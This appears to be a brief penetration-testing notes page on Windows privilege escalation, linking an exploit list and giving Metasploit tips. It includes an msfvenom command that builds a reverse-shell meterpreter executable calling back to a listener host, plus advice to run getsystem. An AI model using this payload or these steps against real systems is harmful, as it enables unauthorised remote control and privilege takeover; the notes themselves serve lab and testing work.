# Windows Privilege Escalation
Check out these repositories:

[WHP](https://github.com/51x/WHP) List of low hanging exploits to try

## Metasploit
If you are able to catch a meterpreter shell, always check post/multi/recon/local_exploit_suggester first.
```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -f exe -o reverse.exe
```

Also use the meterpreter command `getsystem`